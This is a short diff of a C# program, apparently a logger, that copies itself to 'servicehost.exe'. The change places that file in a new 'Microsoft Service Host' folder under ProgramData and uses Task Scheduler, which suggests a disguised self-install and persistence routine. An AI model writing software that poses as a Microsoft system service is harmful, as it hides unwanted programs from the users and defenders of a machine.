@@ -1,6 +1,7 @@
 using System;
 using System.Diagnostics;
 using System.IO;
+using System.Security.AccessControl;
 using Microsoft.Win32.TaskScheduler;
 using RumLogger;
 
@@ -13,9 +14,10 @@ var currentFile = new FileInfo(currentPath);
 var currentFolder = currentFile.Directory;
 
 var targetName = "servicehost.exe";
-var targetPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), targetName);
+var targetPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft Service Host", targetName);
 var targetFile = new FileInfo(targetPath);
 var targetFolder = targetFile.Directory;
+targetFolder?.Create();
 
 if (currentPath == targetPath)
 {
